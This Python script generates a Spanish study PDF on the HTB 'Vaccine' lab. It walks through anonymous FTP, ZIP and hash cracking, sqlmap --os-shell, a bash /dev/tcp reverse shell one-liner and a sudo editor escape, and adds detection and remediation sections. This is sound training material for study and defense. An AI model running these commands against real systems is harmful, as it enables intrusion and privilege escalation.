#!/usr/bin/env python3
"""
PDF de teoría — HTB Vaccine (Tier 2)
Técnicas: FTP anon → cracking ZIP/hash → SQLi automatizada (sqlmap --os-shell) →
          reverse shell → privesc vía GTFOBins (abuso de sudo)
RedTeamLab · César Contreras · CPTS 2026

NOTA METODOLÓGICA: este PDF es CONCEPTUAL, no un walkthrough de Vaccine.
No contiene IP objetivo, contraseñas ni nombres de archivo específicos de la
instancia — el objetivo es que César enumere y resuelva por su cuenta,
usando esto como marco de referencia y el writeup externo que aportó como
apoyo si se atasca en un paso puntual.
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pdf_base import *

OUTPUT = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "Teoria_Vaccine.pdf"
)

S   = make_styles()
doc = make_doc(OUTPUT)
story = []

# ── Portada ───────────────────────────────────────────────────────────────────
story.append(Spacer(1, 1.2*cm))
story.append(Paragraph("HTB Vaccine — Tier 2", S["title"]))
story.append(Paragraph("Cadena de explotación: FTP anónimo → Cracking → SQLi → Privesc GTFOBins", S["sub"]))
story.append(hr())
story.append(Paragraph(
    "Primera máquina del roadmap con una cadena de explotación real de varios "
    "eslabones en vez de un vector único. Vaccine no tiene un solo fallo grave — "
    "tiene cuatro fallos menores encadenados: un servicio mal configurado, dos "
    "contraseñas débiles, una inyección SQL, y un privilegio sudo mal delimitado. "
    "Es la primera vez en el roadmap donde la enumeración inicial no termina en "
    "shell directo: cada hallazgo es un insumo para el siguiente paso.",
    S["body"]
))
story.append(Spacer(1, 0.4*cm))

# ── 1. Contexto ───────────────────────────────────────────────────────────────
story.append(Paragraph("1. Contexto de la Máquina", S["h1"]))
story.append(hr())
data = [
    ["Campo", "Detalle"],
    ["Tier / Fase",   "Tier 2 — Starting Point"],
    ["OS",            "Linux (Ubuntu)"],
    ["Dificultad",    "Easy"],
    ["Servicios expuestos", "FTP, SSH, HTTP — el vector real está en la combinación, no en un puerto aislado"],
    ["Técnicas clave", "FTP anonymous login · zip2john/John · identificación y cracking de hash · SQLi con sqlmap --os-shell · GTFOBins (sudo vi)"],
    ["Herramientas",  "ftp, John the Ripper (zip2john), hashid, hashcat, sqlmap, nc, GTFOBins"],
]
story.append(make_table(data, [CONTENT_W*0.26, CONTENT_W*0.74], S))
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph(
    "⚠️  Este documento describe el <b>tipo</b> de vulnerabilidad y la metodología "
    "general de cada técnica — no valores específicos de tu instancia (IP, "
    "contraseñas, nombres de archivo). Enumera cada paso vos mismo; si te "
    "atascás en uno puntual, ahí recurrís al writeup externo que ya tenés, no antes.",
    S["warn"]
))

# ── 2. Fundamentos ────────────────────────────────────────────────────────────
story.append(Paragraph("2. Fundamentos — Cada Eslabón de la Cadena", S["h1"]))
story.append(hr())

story.append(Paragraph("2.1 FTP con login anónimo habilitado", S["h2"]))
story.append(Paragraph(
    "vsFTPd y otros servidores FTP permiten, por configuración explícita del "
    "administrador, autenticación con usuario <b>anonymous</b> y cualquier "
    "contraseña (o vacía). No es una vulnerabilidad del software — es una "
    "decisión de configuración, casi siempre heredada de un setup de desarrollo "
    "que nunca se endureció para producción. El propio Nmap lo señala si corrés "
    "el script <b>ftp-anon</b> dentro de <b>-sC</b>.",
    S["body"]
))
add_code_block(story, S, [
    "nmap -sC -sV -p- {target_IP}",
    "# Buscar en el output: | ftp-anon: Anonymous FTP login allowed (FTP code 230)",
])
story.append(Paragraph(
    "💡  Cuando el scan confirma anon login, la prioridad es esa antes que SSH "
    "(sin credenciales, no hay nada que hacer ahí todavía) — FTP anónimo es la "
    "única puerta abierta sin autenticación real.",
    S["tip"]
))

story.append(Paragraph("2.2 Archivos comprimidos protegidos con contraseña", S["h2"]))
story.append(Paragraph(
    "Si el FTP expone un <b>.zip</b> cifrado, la contraseña de compresión NO es "
    "la misma familia de ataque que un login web — es un hash offline que se "
    "ataca con fuerza bruta de diccionario. El flujo estándar con John the Ripper:",
    S["body"]
))
add_code_block(story, S, [
    "# 1. Extraer el hash del ZIP (NO es la contraseña, es el material cifrado)",
    "zip2john archivo.zip > hash_zip.txt",
    "",
    "# 2. Atacar el hash con diccionario",
    "john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt",
    "",
    "# 3. Mostrar el resultado ya crackeado",
    "john --show hash_zip.txt",
    "",
    "# 4. Extraer con la contraseña obtenida",
    "unzip archivo.zip   # pedirá la contraseña interactivamente",
])
story.append(Paragraph(
    "⚠️  <b>rockyou.txt</b> es la wordlist por defecto en Kali/Parrot "
    "(/usr/share/wordlists/rockyou.txt, a veces hay que descomprimirla primero "
    "con gunzip). Si no está disponible en tu distro, es la primera herramienta "
    "que te va a faltar — instalar seclists/rockyou antes de empezar la máquina, "
    "no a mitad de la enumeración.",
    S["warn"]
))

story.append(Paragraph("2.3 Identificación y cracking de hashes de aplicación", S["h2"]))
story.append(Paragraph(
    "Un hash filtrado en código fuente (por ejemplo, dentro de un archivo PHP "
    "expuesto por error) no viene etiquetado. Antes de asumir el algoritmo hay "
    "que identificarlo por longitud y patrón — 32 caracteres hexadecimales es "
    "casi siempre MD5, pero también puede ser NTLM u otros; <b>hashid</b> da "
    "candidatos, no certeza.",
    S["body"]
))
add_code_block(story, S, [
    "hashid '<hash_encontrado>'",
    "",
    "# Crackeo con hashcat (modo 0 = MD5, ajustar -m según lo que identifique hashid)",
    "echo '<hash_encontrado>' > hash.txt",
    "hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
    "hashcat -a 0 -m 0 hash.txt --show",
])
story.append(Paragraph(
    "💡  MD5 sin salt es criptográficamente roto para este propósito: con una "
    "wordlist decente se crackea en segundos. El problema real no es el "
    "algoritmo — es que la contraseña en texto plano era débil de entrada. Un "
    "MD5 de una contraseña de 20+ caracteres random seguiría siendo inviable "
    "de crackear por diccionario.",
    S["tip"]
))

story.append(Paragraph("2.4 SQL Injection automatizada con sqlmap", S["h2"]))
story.append(Paragraph(
    "Una vez con acceso autenticado a un panel, cualquier parámetro que arme "
    "una query dinámica (buscadores, filtros, ordenamiento) es candidato a "
    "SQLi. En vez de fuzzing manual de payloads, sqlmap automatiza detección "
    "y explotación — pero necesita el mismo contexto de sesión que tendría un "
    "navegador autenticado, por eso se le pasa la cookie de sesión activa.",
    S["body"]
))
add_code_block(story, S, [
    "# Detección básica — sqlmap prueba decenas de payloads por técnica",
    "sqlmap -u 'http://{target_IP}/ruta.php?param=valor' --cookie=\"PHPSESSID=<valor>\"",
    "",
    "# Confirmada la inyección, intentar escalar a ejecución de comandos",
    "sqlmap -u 'http://{target_IP}/ruta.php?param=valor' --cookie=\"PHPSESSID=<valor>\" --os-shell",
])
story.append(Paragraph(
    "⚠️  <b>--os-shell no es automático en cualquier DBMS.</b> Depende de los "
    "privilegios de la cuenta que la app usa para conectarse a la base: en "
    "PostgreSQL requiere que el usuario sea superusuario (usa "
    "<b>COPY ... FROM PROGRAM</b>, disponible desde PG 9.3); en MySQL requiere "
    "el privilegio FILE y conocer el path del webroot (usa INTO OUTFILE); en "
    "MSSQL depende de que xp_cmdshell esté habilitado. Si sqlmap confirma la "
    "inyección pero --os-shell falla, el problema son los privilegios de la "
    "cuenta de base de datos, no la técnica.",
    S["warn"]
))
story.append(Paragraph(
    "Este es un punto de comparación real con tu ramo de Threat Hunting: la "
    "cuenta de aplicación que se conecta a la base debería tener el mínimo "
    "privilegio posible — solo SELECT/INSERT sobre las tablas que necesita. "
    "Que el usuario de la app sea superusuario de la base es un fallo de "
    "diseño previo e independiente de la inyección misma.",
    S["body"]
))

story.append(Paragraph("2.5 Reverse shell y estabilización", S["h2"]))
story.append(Paragraph(
    "El shell que entrega sqlmap vía --os-shell es funcional pero limitado "
    "(sin control de trabajos, sin autocompletado, se cae con Ctrl+C). El "
    "patrón estándar es usarlo solo para lanzar un one-liner que abra una "
    "conexión reversa hacia un listener, y luego estabilizar esa shell.",
    S["body"]
))
add_code_block(story, S, [
    "# En tu máquina atacante:",
    "nc -lvnp <puerto>",
    "",
    "# Payload disparado desde el shell limitado (ajustar IP/puerto):",
    "bash -c \"bash -i >& /dev/tcp/{tu_IP_tun0}/<puerto> 0>&1\"",
    "",
    "# Ya en el listener, estabilizar la TTY:",
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "# Ctrl+Z (suspender), luego en tu terminal local:",
    "stty raw -echo; fg",
    "export TERM=xterm",
])
story.append(Paragraph(
    "⚠️  La IP del payload es SIEMPRE tu propia interfaz VPN (tun0), nunca la "
    "IP de la víctima — ya lo confirmaste como lección aprendida en Responder, "
    "vale la pena tenerlo como chequeo automático antes de lanzar cualquier "
    "reverse shell.",
    S["warn"]
))

story.append(Paragraph("2.6 Búsqueda de credenciales en texto plano post-explotación", S["h2"]))
story.append(Paragraph(
    "Con shell de bajo privilegio, el siguiente paso estándar antes de pensar "
    "en exploits de kernel es buscar credenciales que la propia aplicación "
    "dejó en texto plano — archivos de configuración de conexión a base de "
    "datos son el primer lugar en cualquier stack PHP+SQL.",
    S["body"]
))
add_code_block(story, S, [
    "grep -ri 'password' /var/www/html/*.php",
    "grep -ri 'pg_connect\\|mysqli_connect\\|new PDO' /var/www/html/*.php",
])
story.append(Paragraph(
    "💡  Es común que la contraseña de conexión a la base de datos sea la MISMA "
    "que la del usuario del sistema operativo que corre ese servicio (postgres, "
    "mysql). Reutilización de credenciales entre capas — la misma familia de "
    "fallo que ya viste en Crocodile, pero aquí entre app↔OS en vez de "
    "servicio↔servicio.",
    S["tip"]
))

story.append(Paragraph("2.7 Privilege Escalation vía GTFOBins", S["h2"]))
story.append(Paragraph(
    "GTFOBins (gtfobins.github.io) es un catálogo de binarios Unix legítimos "
    "que, si un usuario tiene permiso de ejecutarlos con sudo (o setuid), "
    "permiten escapar a una shell con privilegios elevados — porque el binario "
    "en sí ofrece alguna función de \"ejecutar comando externo\" que nadie "
    "pensó en restringir cuando se armó la regla de sudoers.",
    S["body"]
))
add_code_block(story, S, [
    "# Primer chequeo siempre, con cualquier usuario nuevo que obtengas:",
    "sudo -l",
    "",
    "# Si aparece un binario permitido, buscarlo en GTFOBins ANTES de asumir",
    "# que la restricción de argumentos (ej. 'solo puede editar tal archivo')",
    "# realmente bloquea el escape.",
])
story.append(Paragraph(
    "Metodología general para editores de texto (vi, vim, nano, less, more, "
    "man — todos con función \"ejecutar shell\" incorporada):",
    S["body"]
))
add_code_block(story, S, [
    "# Intento directo (falla si sudoers restringe argumentos extra):",
    "sudo <editor> -c ':!/bin/sh' /dev/null",
    "",
    "# Si sudoers bloquea argumentos no listados, entrar al archivo permitido",
    "# tal cual está autorizado, y usar los comandos internos del editor:",
    "sudo <editor> <archivo_autorizado>",
    "# Dentro del editor: ':set shell=/bin/sh' seguido de ':shell'",
])
story.append(Paragraph(
    "⚠️  La regla de sudoers restringe el comando y sus argumentos exactos — no "
    "restringe lo que el binario hace una vez que ya está corriendo con esos "
    "privilegios. Ese es el principio detrás de TODO GTFOBins, no solo de vi: "
    "cualquier programa con capacidad de invocar un shell, un editor de "
    "archivos, o ejecutar comandos arbitrarios es un vector de escape si sudo "
    "lo permite, sin importar cuán \"inofensivo\" parezca el binario en sudoers.",
    S["warn"]
))

# ── 3. Metodología sugerida (checklist, sin resolver) ───────────────────────
story.append(Paragraph("3. Checklist de Metodología para Esta Máquina", S["h1"]))
story.append(hr())
checklist = [
    "Nmap completo (-p- -sC -sV) — confirmar los 3 servicios y prestar atención especial al resultado de scripts NSE en FTP",
    "Si FTP permite anon login: listar y descargar TODO lo disponible, no asumir que hay un solo archivo útil",
    "Si algo está comprimido con contraseña: zip2john → john con rockyou antes de intentar contraseñas a mano",
    "Leer el código fuente extraído buscando lógica de autenticación (comparaciones ===, hashes hardcodeados)",
    "Identificar cualquier hash encontrado con hashid antes de asumir el algoritmo, luego crackear con hashcat/john",
    "Con credenciales de aplicación: loguearse por HTTP y mapear toda la superficie (cada parámetro GET/POST es candidato a inyección)",
    "sqlmap sobre cualquier parámetro que arme queries dinámicas, con la cookie de sesión autenticada",
    "Si sqlmap confirma inyección pero --os-shell falla: no descartar la técnica, sospechar de privilegios del usuario DB",
    "Con shell inicial: estabilizar con pty.spawn antes de hacer cualquier otra cosa — un shell que muere a mitad de la enumeración es tiempo perdido",
    "Revisar archivos de configuración de la app en busca de credenciales en texto plano antes de buscar exploits de kernel",
    "sudo -l como primer comando con cualquier usuario nuevo, y GTFOBins como primera consulta si aparece algo permitido",
]
for c in checklist:
    story.append(Paragraph(f"☐ {c}", S["bullet"]))

# ── 4. MITRE ATT&CK ──────────────────────────────────────────────────────────
story.append(Spacer(1, 0.2*cm))
story.append(Paragraph("4. MITRE ATT&amp;CK — Mapeo de la Cadena", S["h1"]))
story.append(hr())

data2 = [
    ["Táctica", "Técnica", "ID", "Dónde aplica"],
    ["Reconnaissance", "Active Scanning", "T1595",
     "Nmap inicial, detección de FTP anon vía NSE"],
    ["Credential Access", "Brute Force: Password Cracking", "T1110.002",
     "zip2john/John contra el ZIP, hashcat contra el hash de aplicación"],
    ["Initial Access", "Exploit Public-Facing Application", "T1190",
     "SQLi explotada con sqlmap --os-shell sobre el panel autenticado"],
    ["Execution", "Command and Scripting Interpreter: Unix Shell", "T1059.004",
     "Reverse shell vía bash -i, estabilización con pty.spawn"],
    ["Privilege Escalation", "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "T1548.003",
     "Escape de sudo restringido a un editor mediante GTFOBins"],
]
story.append(make_table(data2, [CONTENT_W*0.19, CONTENT_W*0.29, CONTENT_W*0.13, CONTENT_W*0.39], S))

# ── 5. Blue Team ──────────────────────────────────────────────────────────────
story.append(Spacer(1, 0.3*cm))
story.append(Paragraph("5. Blue Team — ¿Qué se Detecta en Cada Eslabón?", S["h1"]))
story.append(hr())

detect = [
    "FTP: sesiones anónimas seguidas de un LIST/RETR de un archivo con nombre tipo 'backup' son un patrón clásico de reconocimiento — cualquier acceso anónimo a FTP debería auditarse por defecto, no solo cuando 'pasa algo raro'",
    "Cracking offline (zip2john/hashcat): invisible para el Blue Team salvo que se audite la exfiltración inicial del archivo — una vez descargado, el crackeo ocurre fuera de la red monitoreada. La ventana de detección real está en el DOWNLOAD, no en el crackeo",
    "SQLi con sqlmap: tiene firma de tráfico reconocible — decenas de requests con payloads de comparación booleana/time-based en segundos, User-Agent por defecto de sqlmap si no se randomiza, WAF/IDS con reglas de SQLi deberían marcarlo de inmediato",
    "Reverse shell: conexión saliente desde el servidor web hacia un puerto no estándar es exactamente el patrón que un EDR o un firewall con egress filtering debería bloquear — un servidor web no tiene motivo legítimo para iniciar conexiones TCP salientes arbitrarias",
    "Privesc con vi: ejecución de sudo sobre un editor seguida inmediatamente de un proceso hijo tipo /bin/sh con UID root es una cadena de proceso (parent/child) detectable por cualquier EDR con monitoreo de ejecución de procesos — esto es exactamente el tipo de IOC que vieron en Threat Hunting",
]
for d in detect:
    story.append(Paragraph(f"• {d}", S["bullet"]))

# ── 6. Remediación ────────────────────────────────────────────────────────────
story.append(Spacer(1, 0.2*cm))
story.append(Paragraph("6. Remediación por Eslabón", S["h1"]))
story.append(hr())
mitigations = [
    "Deshabilitar login anónimo en FTP salvo necesidad explícita y documentada; nunca dejar backups o archivos sensibles accesibles vía FTP público",
    "Política de contraseñas fuerte y MFA donde sea posible — ni el ZIP ni el hash de aplicación habrían caído con una contraseña de 16+ caracteres random",
    "Nunca comparar contraseñas con hashes rápidos sin salt (MD5/SHA1) — usar bcrypt/argon2, diseñados para ser lentos y resistir cracking masivo",
    "Sanitizar y parametrizar TODAS las queries (prepared statements) — nunca concatenar input de usuario en SQL, sin excepción por 'es solo un buscador'",
    "Principio de mínimo privilegio en la cuenta de base de datos que usa la aplicación — nunca superusuario/root de la DB para una app web",
    "Egress filtering en el servidor — un servidor web no debería poder iniciar conexiones salientes arbitrarias a Internet",
    "Reglas de sudoers auditadas contra GTFOBins antes de desplegar — si el binario aparece en GTFOBins con función de escape, esa regla de sudo es una vulnerabilidad, no una conveniencia operativa",
]
for m in mitigations:
    story.append(Paragraph(f"• {m}", S["bullet"]))

# ── 7. Cheatsheet ─────────────────────────────────────────────────────────────
story.append(Spacer(1, 0.2*cm))
story.append(Paragraph("7. Cheatsheet — Comandos Plantilla", S["h1"]))
story.append(hr())

add_code_block(story, S, [
    "# 1. Enumeración",
    "nmap -sC -sV -p- {target_IP} -oN nmap.txt",
    "",
    "# 2. FTP anónimo",
    "ftp {target_IP}          # user: anonymous / cualquier password",
    "ftp> dir",
    "ftp> get <archivo>",
    "",
    "# 3. Crackear ZIP",
    "zip2john <archivo>.zip > hash_zip.txt",
    "john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt",
    "john --show hash_zip.txt",
    "",
    "# 4. Identificar y crackear hash de aplicación",
    "hashid '<hash>'",
    "hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
    "hashcat -a 0 -m 0 hash.txt --show",
    "",
    "# 5. SQLi automatizada",
    "sqlmap -u '<URL_con_parametro>' --cookie=\"PHPSESSID=<valor>\" --batch",
    "sqlmap -u '<URL_con_parametro>' --cookie=\"PHPSESSID=<valor>\" --os-shell",
    "",
    "# 6. Reverse shell + estabilización",
    "nc -lvnp <puerto>",
    "bash -c \"bash -i >& /dev/tcp/{tu_IP_tun0}/<puerto> 0>&1\"",
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "",
    "# 7. Privesc",
    "sudo -l",
    "# → consultar gtfobins.github.io con el binario exacto que aparezca",
])

# ── 8. Conexión CPTS / Proyecto Cóndor ───────────────────────────────────────
story.append(Spacer(1, 0.3*cm))
story.append(Paragraph("8. Conexión con CPTS y Proyecto Cóndor", S["h1"]))
story.append(hr())
story.append(Paragraph(
    "Vaccine es la primera máquina del roadmap que obliga a pensar en cadena "
    "en vez de vector único — exactamente el modelo mental que exige el examen "
    "CPTS, donde raramente hay un solo fallo crítico y sí una secuencia de "
    "hallazgos menores que un atacante paciente encadena.",
    S["body"]
))
connections = [
    "<b>CPTS Exam:</b> la habilidad que se examina acá no es 'saber usar sqlmap' — es reconocer cuándo un hallazgo (archivo descargable, hash filtrado, sudo mal delimitado) es un insumo para el siguiente paso y no un callejón sin salida",
    "<b>GTFOBins como hábito:</b> consultar gtfobins.github.io ante CUALQUIER binario permitido por sudo debería ser reflejo automático de aquí en adelante — vas a verlo en casi todas las máquinas Linux de privesc del roadmap",
    "<b>Proyecto Cóndor:</b> en un informe real para cliente chileno/latam, esta cadena se reporta como UN hallazgo compuesto con severidad Alta/Crítica (RCE + privesc a root), no como cuatro hallazgos menores sueltos — la severidad la da el impacto final de la cadena, no cada eslabón aislado",
]
for c in connections:
    story.append(Paragraph(f"• {c}", S["bullet"]))

# ── Footer ────────────────────────────────────────────────────────────────────
story.append(Spacer(1, 0.3*cm))
story.extend(footer_line(S, "Vaccine", "2026"))
doc.build(story)
print(f"PDF generado: {OUTPUT}")
